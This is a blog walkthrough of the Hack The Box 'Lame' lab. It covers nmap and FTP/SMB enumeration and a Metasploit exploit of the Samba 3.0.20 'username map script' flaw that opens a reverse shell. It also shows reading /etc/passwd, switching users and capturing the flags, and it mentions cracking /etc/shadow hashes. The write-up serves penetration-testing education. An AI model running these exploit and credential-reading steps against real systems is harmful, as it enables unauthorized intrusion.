---
title: Lame machine HTB
cover: ./lame-machine-img/Lame.png
date: 2024-07-17T22:42:00+03:00
draft: false
---

---
### Introduction

Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.

---

**Target IP:** 10.129.79.228

---

### Enumeration

>Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.

---

### Initial Nmap Scan

We start with a comprehensive Nmap scan to discover open ports and services:

~~~bash
sudo nmap -sV -p- --open --min-rate 5000 -n -Pn 10.129.79.228 -v -oN first_scan
~~~

**Let's break down this command**

sudo: Run Nmap with root privileges

- -sV: Probe open ports to determine service/version info
- -p-: Scan all ports
- --open: Only show open (or possibly open) ports
- --min-rate 5000: Send packets no slower than 5000 per second
- -n: No DNS resolution
- -Pn: Treat all hosts as online -- skip host discovery
- -v: Verbose output
- -oN first_scan: Output in normal format to file 'first_scan'

---

*Results:*

- Port 21: FTP (vsftpd 2.3.4)
- Port 22: SSH (OpenSSH 4.7p1 Debian 8ubuntu1)
- Port 139: Samba smbd 3.X - 4.X
- Port 445: Samba smbd 3.X - 4.X

OS: Unix/Linux

---

>This scan gives us an overview of the services running on the target machine, helping us focus our further enumeration efforts.

---

### Further Enumeration FTP (Port 21)

We perform a more detailed scan of the FTP service:

~~~sh
sudo nmap -sVC -p21 10.129.79.228 -v -oN script_scan_port_21
~~~

This command uses -sVC to run default scripts (-sC) and version scanning (-sV) on port 21.

---

**Findings:**

- Anonymous FTP login allowed
- ASCII type
- Plain text connections

These findings suggest that the FTP server might be vulnerable to anonymous access. Let's try to connect:

~~~bash
ftp anonymous@10.129.79.228
~~~

*Result:* Successfully logged in, but no interesting files found.

---

### Samba (Port 139)

Next, we focus on the Samba service:

~~~bash
sudo nmap -sVC -p139 10.129.79.228 -v -oN script_scan_port_139
~~~

**Findings:**

- OS: Unix (Samba 3.0.20-Debian)
- Computer name: lame
- Domain name: hackthebox.gr
- FQDN: lame.hackthebox.gr

This information helps us understand the target environment better.

---

### SMB Enumeration

We use smbclient to list available shares:

~~~bash
smbclient -N -L //10.129.79.228/
~~~

>smbclient is a tool for accessing SMB/CIFS resources on servers. The -N option suppresses the password prompt, and -L lists the available shares.

---

**Discovered shares:**

- print$
- tmp
- opt
- IPC$
- ADMIN$

We then attempt to access the 'tmp' share:

~~~bash
smbclient -N //10.129.79.228/tmp
~~~

While we found some files, nothing immediately useful for exploitation was discovered.

---

### 2. Vulnerability Identification

After researching the versions of services found, particularly Samba 3.0.20, we identified a potential exploit:

Samba "username map script" Command Execution

This vulnerability allows for remote command execution, which could give us a foothold on the system.

---

### 3. Exploitation

**Using Metasploit**

Metasploit is a powerful penetration testing framework that provides a collection of exploits and auxiliary tools.

Start Metasploit:

~~~sh
msfconsole
~~~

---

**Search for the Samba exploit:**

~~~bash
msfconsole> search samba
~~~

{{< image src="../../../lame-machine-img/1.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}

---

**Select and configure the exploit:**

~~~bash
msfconsole> use exploit/multi/samba/usermap_script
msfconsole> set RHOSTS 10.129.79.228
msfconsole> set LHOST [Your IP]
~~~

{{< image src="../../../lame-machine-img/2.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}

Here, we're setting up the exploit with our target IP (RHOSTS) and our own IP (LHOST) for the reverse shell connection.

---
Run the exploit:

~~~bash
msfconsole> run
~~~

{{< image src="../../../lame-machine-img/3.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}

---

### 4. Post-Exploitation

Once we have access to the system, our goal is to find and extract valuable information, such as flags in a CTF scenario.

**Obtaining Root Flag**

Navigate to root directory:

~~~bash
cd root
~~~

{{< image src="../../../lame-machine-img/4.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}

---

**Cat the root flag:**

~~~bash
cat root.txt
~~~

---

**Obtaining User Flag**

*Identify users:*

~~~bash
cat /etc/passwd
~~~

>This file contains user account information.

{{< image src="../../../lame-machine-img/5.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
{{< image src="../../../lame-machine-img/6.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}

---

Switch to user 'makis':

~~~bash
su makis
~~~

{{< image src="../../../lame-machine-img/7.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}

---

Navigate to makis's home directory:

~~~bash
cd 
~~~

{{< image src="../../../lame-machine-img/8.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}

---

Cat the user flag:

~~~bash
cat user.txt
~~~

{{< image src="../../../lame-machine-img/9.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}

---

### Conclusion

In this walkthrough, we successfully compromised the Lame machine by exploiting an outdated Samba version. We used various tools and techniques common in penetration testing:

- Nmap for initial reconnaissance and service enumeration
- smbclient for SMB share exploration
- Metasploit for exploit delivery

---

### Additional Notes

We found an id_dsa key in makis's .ssh directory but couldn't use it due to outdated key types.

This highlights the importance of keeping SSH configurations up-to-date.

Creating a new SSH key as root wasn't feasible without makis's password, demonstrating proper user privilege separation.

While it's possible to crack makis's password hash from /etc/shadow, it wasn't necessary for this challenge. However, in a real-world scenario, this could be a potential avenue for further exploitation.
